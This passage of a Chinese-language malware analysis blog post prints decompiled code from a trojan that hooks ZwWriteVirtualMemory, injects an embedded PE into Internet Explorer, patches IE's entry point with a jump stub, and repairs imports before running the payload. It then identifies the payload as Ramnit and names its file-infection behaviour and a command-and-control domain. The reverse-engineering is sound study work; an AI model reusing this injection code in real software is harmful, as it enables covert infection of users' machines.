+  LODWORD(v5) = old_ZwWriteVirtualMemory(
+                  hProcess,                     // here is IE process id
+                  BaseAddress,					//some address in IE
+                  Buffer,
+                  NumberOfBytesToWrite,
+                  NumberOfBytesWritten);
+  v9 = v5;
+  if ( hProcess != (HANDLE)-1 &amp;&amp; !ieentry )
+  {
+v6 = GetEntryPointForProcess(hProcess);
+//利用ZwQueryInformationProcess从PEB里获取IE进程的ImageBase，之后解析内存PE得到入口点
+    if ( v6 )
+    {
+      dword_40DFA3 = 1;
+      ieentry = v6;
+      v7 = ModifyIe(hProcess, &amp;injectcode, 0x9800);//将重要数据(INJECTSTR)和函数注入到目标进程，见①②
+      ie_inject_d = HIDWORD(v7);
+      ie_inject_f = v7;
+      if ( ie_inject_f )
+      {
+        VirtualProtectEx(hProcess, ieentry, 0xCu, 0x40u, &amp;oldpro);
+        WriteProcessMemory(hProcess, ieentry, &amp;jmpshell, 0xCu, &amp;NumberOfBytesWrittena);//改写IE入口点逻辑
+                                                //jmpshell硬编码以下指令： sizeof=0x0C
+                                                // +00 0xBF            mov edi, ie_inject_f
+                                                // +01 ie_inject_f
+                                                // +05 0x68            push ie_inject_d
+                                                // +06 ie_inejct_d
+                                                // +0A 0xFF            call edi
+                                                // +0B 0xD7
+        VirtualProtectEx(hProcess, ieentry, 0xCu, oldpro, &amp;oldpro);// 
+      }
+    }
+  }
+  return v9;
+}
+</code></pre><ul>
+<li>将自身的木马种植到目标IE进程，同时修复PE结构</li>
+</ul>
+<pre tabindex="0"><code>LONGLONG __stdcall ModifyIe(HANDLE hProcess, BYTE *injectdata, int injectlen)
+{
+  v19 = 0x10000000;
+  optheader = (IMAGE_OPTIONAL_HEADER32 *)validate_getoptionheader((int)injectdata, injectlen);//验证PE结构
+  if ( !optheader )
+    goto LABEL_18;
+  imagebase = optheader-&gt;ImageBase;
+  imagesize = optheader-&gt;SizeOfImage;
+  do                 // 尝试在自身进程和IE进程中获取0x3000大小的同地址内存
+  {
+    v19 += 0x10000;
+    lpAddress = (LPVOID)(v19 + imagebase);
+    injectbase = VirtualAlloc((LPVOID)(v19 + imagebase), imagesize, 0x3000u, 0x40u);
+    if ( injectbase )
+    {
+      VirtualFree(injectbase, 0, 0x8000u);
+      injectbase = VirtualAllocEx(hProcess, lpAddress, imagesize, 0x3000u, 0x40u);
+    }
+  }
+  while ( v19 &lt; 0x30000000 &amp;&amp; !injectbase );
+  if ( injectbase
+&amp;&amp; ConstructPe(hProcess, injectbase, injectdata, injectlen, &amp;inject_d, 0)
+//从文件内嵌的PE重新构造重定位表、导入表以及各个节，内嵌PE见③
+    &amp;&amp; WriteProcessMemory(hProcess, injectbase, (LPCVOID)inject_d.ImageBase, inject_d.ImageSize, 0)// 0xD000
+    &amp;&amp; (len1 = getshellcodelen((unsigned __int8 *)FixImportTable),
+        (v5 = (int (__stdcall *)(_DWORD, int, int, INJECTSTR *))AllocMemoryforShellCode(hProcess, FixImportTable, len1)) != 0)
+    &amp;&amp; (inject_d.FixImportTable = v5,
+        len2 = getshellcodelen((unsigned __int8 *)setsegproperty),
+        (v7 = (int (__stdcall *)(DWORD))AllocMemoryforShellCode(hProcess, setsegproperty, len2)) != 0)
+    &amp;&amp; (inject_d.SetSegProperty = v7,
+        inject_d.LdrLoadDll = (FARPROC)LdrLoadDll,
+        inject_d.LdrGetDllHandle = (FARPROC)LdrGetDllHandle,
+        inject_d.LdrGetProcedureAddress = (FARPROC)LdrGetProcedureAddress,
+        inject_d.RtlInitString = (FARPROC)RtlInitString,
+        inject_d.RtlAnsiStringToUnicodeString = (FARPROC)RtlAnsiStringToUnicodeString,
+        inject_d.RtlFreeUnicodeString = (FARPROC)RtlFreeUnicodeString,
+        inject_d.ZwProtectVirtualMemory = (FARPROC)ZwProtectVirtualMemory,
+        inject_d.ZwDelayExecution = (FARPROC)ZwDelayExecution,
+        a = GetModuleFileNameA(0, inject_d.ImagePath, 0x104u),
+        makecstring((BYTE *)inject_d.ImagePath, a),
+        len3 = getshellcodelen((unsigned __int8 *)modifyieentry),
+        (v9 = AllocMemoryforShellCode(hProcess, modifyieentry, len3)) != 0)
+    &amp;&amp; (v13 = (unsigned int)v9, (v10 = AllocMemoryforShellCode(hProcess, &amp;inject_d, 0x138u)) != 0) )
+  {
+    result = __PAIR__((unsigned int)v10, v13);
+  }
+  else
+  {
+LABEL_18:
+    result = 0i64;
+  }
+  return result;
+}
+</code></pre><ul>
+<li>写入的数据ie_inject_d结构</li>
+</ul>
+<pre tabindex="0"><code>00000000 INJECTSTR       struc ; (sizeof=0x138, mappedto_37) ; XREF: ModifyIe/r
+00000000 ImageBase       dd ?			//注入木马的基址
+00000004 ImageEntry      dd ?			//注入木马的入口
+00000008 ImageSize       dd ?
+0000000C FixImportTable  dd ?         //用于修复导入表
+00000010 SetSegProperty  dd ?        //用于修复PE节属性
+00000014 LdrLoadDll      dd ?                    ; offset
+00000018 LdrGetDllHandle dd ?                    ; offset
+0000001C LdrGetProcedureAddress dd ?             ; offset
+00000020 RtlInitString   dd ?                    ; offset
+00000024 RtlAnsiStringToUnicodeString dd ?       ; offset
+00000028 RtlFreeUnicodeString dd ?               ; offset
+0000002C ZwProtectVirtualMemory dd ?             ; offset
+00000030 ZwDelayExecution dd ?                   ; offset
+00000034 ImagePath       db 260 dup(?)		//母程序路径
+00000138 INJECTSTR       ends
+</code></pre><p>ie_inject_f函数仍然是修复导入表：</p>
+<pre tabindex="0"><code>void __cdecl modifyieentry(INJECTSTR *injectdata)
+{
+  v1 = __readeflags();
+  v6 = v1;
+  if ( injectdata &amp;&amp; injectdata-&gt;FixImportTable(0, injectdata-&gt;ImageBase, injectdata-&gt;ImageSize, injectdata) )
+  {
+    secnum = *(_WORD *)(*(_DWORD *)(injectdata-&gt;ImageBase + 60) + injectdata-&gt;ImageBase + 6);
+    secheaders = (IMAGE_SECTION_HEADER *)(*(_WORD *)(*(_DWORD *)(injectdata-&gt;ImageBase + 60) + injectdata-&gt;ImageBase + 20)
+                                        + *(_DWORD *)(injectdata-&gt;ImageBase + 60)
+                                        + injectdata-&gt;ImageBase
+                                        + 24);
+    if ( *(_WORD *)(*(_DWORD *)(injectdata-&gt;ImageBase + 60) + injectdata-&gt;ImageBase + 6) )
+    {
+      do
+      {
+        v4 = secnum;
+        v5 = injectdata-&gt;SetSegProperty(secheaders-&gt;Characteristics);
+        v10 = secheaders-&gt;VirtualAddress + injectdata-&gt;ImageBase;
+        v9 = secheaders-&gt;Misc.PhysicalAddress;
+        ((void (__stdcall *)(signed int, DWORD *, DWORD *, int, char *))injectdata-&gt;ZwProtectVirtualMemory)(
+          -1,
+          &amp;v10,
+          &amp;v9,
+          v5,
+          &amp;v11);
+        ++secheaders;
+        secnum = v4 - 1;
+      }
+      while ( v4 != 1 );
+    }
+    ((void (__stdcall *)(int, signed int, char *))injectdata-&gt;ImageEntry)(//调用注入的木马入口
+      injectdata-&gt;ImageBase,
+      1,
+      injectdata-&gt;ImagePath);
+    v7 = 0;
+    v8 = 0x80000000;
+    ((void (__stdcall *)(_DWORD, int *))injectdata-&gt;ZwDelayExecution)(0, &amp;v7);
+  }
+  __writeeflags(v6);
+}
+</code></pre><ul>
+<li>内嵌PE<br>
+
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src=" /img/trojan10.png">
+    </div>
+
+    
+</figure></li>
+</ul>
+<p>  上面的一切努力最后发现重点在于内嵌PE逻辑中，直接用winhex将0x404031处0xD000大小的内嵌PE取出，结果52k</p>
+<h2 id="内嵌pe">内嵌PE</h2>
+<p>
+
+
+
+
+
+
+
+
+
+
+<figure class="">
+
+    <div>
+        <img loading="lazy" alt="" src=" /img/trojan11.png">
+    </div>
+
+    
+</figure>
+  这次IDA已经可以分析出来了，说明是最终形态，搜索一些敏感的字符串可知是Ramnit病毒<a href="http://www.lavasoft.com/mylavasoft/malware-descriptions/blog/viruswin32ramnita">http://www.lavasoft.com/mylavasoft/malware-descriptions/blog/viruswin32ramnita</a>，发现网上已有分析，因此没有继续分析，不过上述加密手段还有很多学习之处</p>
+<ul>
+<li>感染全盘exe dll，改写入口点，增加新PE节.rmnet用于存储恶意木马</li>
+<li>感染html htm，增加如下脚本，在用户%TEMP%文件夹中植入了一个名为“svchost.exe”的二进制文件并执行关联的ActiveX控件，受感染的用户主机会试图连接到与Ramnit相关的一个木马控制服务器——fget-career.com。如下两图所示</li>
+</ul>
+<pre tabindex="0"><code></code></pre>
+    
+  </div>
+
+  
+
+
+  
+
+  
+  
+
+<div class="single-pagination">
+    <hr />
+
+    <div class="flex">
+
+        <div class="single-pagination-prev">
+            
+            <div class="single-pagination-container-prev">
+                <div class="single-pagination-text">←</div>
+                <div class="single-pagination-text">
+                    <a href="/win_posts/20150102_qqmgr/">
+                        QQ管家驱动分析
+                    </a>
+                </div>
+            </div>
+            
+        </div>
+
+        <div class="single-pagination-next">
+            
+            <div class="single-pagination-container-next">
+                <div class="single-pagination-text">
+                    <a href="/win_posts/20150104_driver_stl/">
+                        Windows驱动开发中使用STL
+                    </a>
+                </div>
+                <div class="single-pagination-text">→</div>
+            </div>
+            
+        </div>
+
+    </div>
+
+    <hr />
+</div>
+
+
+
+  
+
+  
+
+  
+  <div class="back-to-top">
+    <a href="#top">
+      back to top
+    </a>
+  </div>
+  
+
+</div>
+
+
+      </main>
+    </div>
+
+    <footer>
+      
+
+    
+    <p>Powered by
+        <a href="https://gohugo.io/">Hugo</a>
+        and
+        <a href="https://github.com/tomfran/typo">tomfran/typo</a>
+    </p>
+    
+    
+    
+
+
+
+    </footer>
+    
+  </body>
+
+  <script>
+
+  function isAuto() {
+    return document.body.classList.contains("auto");
+  }
+
+  function setTheme() {
+    if (!isAuto()) {
+      return
+    }
+
+    document.body.classList.remove("auto");
+    let cls = "light";
+    if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+      cls = "dark";
+    }
+
+    document.body.classList.add(cls);
+  }
+
+  function invertBody() {
+    document.body.classList.toggle("dark");
+    document.body.classList.toggle("light");
+  }
+
+  if (isAuto()) {
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(invertBody);
+  }
+
+  setTheme();
+
+</script>
+
+</html>
